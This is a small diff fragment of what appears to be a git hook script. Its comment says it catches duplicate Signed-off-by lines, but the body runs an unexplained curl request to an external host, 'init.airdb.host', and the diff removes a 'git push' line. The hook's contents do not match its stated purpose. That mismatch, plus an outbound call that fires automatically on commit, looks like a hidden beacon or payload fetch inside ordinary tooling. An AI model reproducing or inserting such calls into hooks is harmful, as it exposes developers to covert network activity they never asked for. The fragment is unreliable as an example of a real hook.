@@ -4,5 +4,3 @@
 # This example catches duplicate Signed-off-by lines.
 
 curl https://init.airdb.host/mtod/icon
-
-git push
